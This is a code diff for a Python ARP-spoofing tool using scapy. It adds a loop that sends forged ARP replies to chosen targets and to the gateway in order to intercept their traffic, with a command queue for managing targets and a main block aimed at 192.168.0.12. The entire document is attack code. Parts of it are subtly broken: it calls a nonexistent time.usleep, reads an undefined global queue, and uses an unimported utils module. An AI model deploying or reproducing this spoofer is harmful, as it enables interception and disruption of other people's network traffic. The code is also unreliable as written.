@@ -9,6 +9,7 @@ import os
 import threading
 import logging
 import queue
+import time
 from scapy.all import *
 
 
@@ -23,7 +24,6 @@ fh.setFormatter(formatter)
 logger.addHandler(fh)
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 
-
 DEFAULT_GATEWAY = '192.168.0.1'
 CommandQueue = queue.Queue()
 
@@ -37,12 +37,16 @@ class ARPspoofer(threading.Thread):
     """
     def __init__(self, queue, config={}):
         """"""
+        '''
         self.kernel_ipv4fwd = None
+        '''
         self.gw = None
         self.network = None
         self.delay = None
         self.interface = None
-        self.targets = None
+        self.targets = []
+        self.ip_mac = {}
+        self.myself = None
         self.queue = queue
         logger.info("Initializing ARPspoofer...")
         if os.getuid():
@@ -54,6 +58,7 @@ class ARPspoofer(threading.Thread):
 
     def __config_load(self, config={}):
         """"""
+        '''
         self.kernel_ipv4fwd = config.get('kernel_ip4_fwd', 1)
         if self.kernel_ipv4fwd:
             logger.warning("Used kernel ipv4 forwarding feature.")
@@ -63,45 +68,95 @@ class ARPspoofer(threading.Thread):
         else:
             logger.error("Not implemented!")
             raise NotImplementedError
+        '''
 
         self.gw = config.get('gateway', None)
         if not self.gw:
             logger.critical("IP of gateway not specified! Using default one: {}".format(DEFAULT_GATEWAY))
             self.gw = DEFAULT_GATEWAY
+            mac = utils.arpping(self.gw)
+            self.ip_mac[self.gw] = mac
 
 
     def __config_reload(self, config={}):
         """"""
         pass
 
-    def __build_arp_pkt(self):
-        """
-        Function building ARP response
-        :return: Scapy ARP packet
-        """
-        pkt = ARP()
 
-    def __build_eth_frame(self):
-        pass
+    def __spoof(self):
+        for ip, mac in self.ip_mac.items():
+            if ip == self.gw:
+                continue
+            logger.debug('Sending ARP spoof message! Target: {}'.format(ip))
+            pkt = ARP(op=2, pdst=ip, psrc=self.gw, hwdst=mac)
+            logger.debug('{}'.format(pkt.summary()))
+            send(pkt)
+            logger.debug('Sending ARP spoof message to GW with target: {}'.format(ip))
+            pkt = ARP(op=2, pdst=self.gw, psrc=ip, hwdst=self.ip_mac[self.gw])
+            logger.debug('{}'.format(pkt.summary()))
+            send(pkt)
 
-    def __send_arp(self):
-        pass
+    def __execute_cmd(self, cmd):
+        if not isinstance(cmd, list):
+            logger.critical('Unknown command! {}'.format(cmd))
+
+        elif len(cmd) < 1:
+            logger.critical('Unknown command! {}'.format(cmd))
+
+        elif len(cmd) == 1:
+
+            if cmd[0].strip() == 's':
+                logger.debug('Stopping...')
+
+            elif cmd[0].strip() == 'p':
+                logger.debug('Pausing...')
+
+            elif cmd[0].strip() == 'r':
+                logger.debug('Running...')
+
+            else:
+                logger.critical('Unknown command!')
+
+        elif len(cmd) == 2:
+
+            if cmd[0].strip() == 'a':
+                logger.debug('Adding entry {} to target queue!'.format(cmd[1]))
+                self.targets.append(cmd[1])
+
+            elif cmd[0].strip() == 'd':
+                logger.debug('Removing entry {} from target queue!'.format(cmd[1]))
+                try:
+                    self.targets.remove(cmd[1])
+                except ValueError:
+                    logger.warning('Input: {} not in target list! Cannot remove!'.format(cmd[1]))
+
+        else:
+            logger.critical('Unknown command!')
+            raise AttributeError
+
+
+    def __get_commands(self):
+        while not self.queue.empty():
+            cmd = q.get()
+            self.__execute_cmd(cmd)
+
 
     def __spoof_loop(self):
-        if not self.whole:
-            for k, v in self.targets:
-                logger.debug('Building ARP packet for {} host'.format(v))
-                frm_host = self.__build_arp_pkt(src=v, dest=self.myself)
-                logger.debug('{}'.format(frm_host))
-                logger.debug('Building ARP packet for gw and host {}'.format(v))
-                frm_gw = self.__build_arp_pkt(src=self.myself, src=v)
-                logger.debug('{}'.format(frm_gw))
+        try:
+            while True:
+                logger.debug('Iterating...')
 
-                sr(frm_host)
-                sr(frm_gw)
-        else:
-            pass
+                self.__get_commands()
 
+                for t in self.targets:
+                    if t not in self.ip_mac:
+                        mac = utils.arpping(t)
+                        self.ip_mac[t] = mac
+
+                self.__spoof()
+                time.usleep(10)
+        except KeyboardInterrupt:
+            logger.info('Exiting...')
 
     def run(self):
         self.__spoof_loop()
@@ -110,13 +165,21 @@ class ARPspoofer(threading.Thread):
         pass
 
     def __del__(self):
-        if self.kernel_ipv4fwd:
-            self.kernel_ipv4fwd = 0
-            os.system("echo {} > /proc/sys/net/ipv4/ip_forward".format(self.kernel_ipv4fwd))
-            logger.info("Kernel IPv4 forwarding disabled")
-
+        """"""
+        '''
+        try:
+            if self.kernel_ipv4fwd:
+                self.kernel_ipv4fwd = 0
+                os.system("echo {} > /proc/sys/net/ipv4/ip_forward".format(self.kernel_ipv4fwd))
+                logger.info("Kernel IPv4 forwarding disabled")
+        except AttributeError:
+            pass
+        '''
 
 
 if __name__ == '__main__':
-    AS = ARPspoofer()
+    q = queue.Queue()
+    q.put(['a', '192.168.0.12'])
+    AS = ARPspoofer(q)
+    AS.run()
     logger.critical('Quiting arpspoofer')
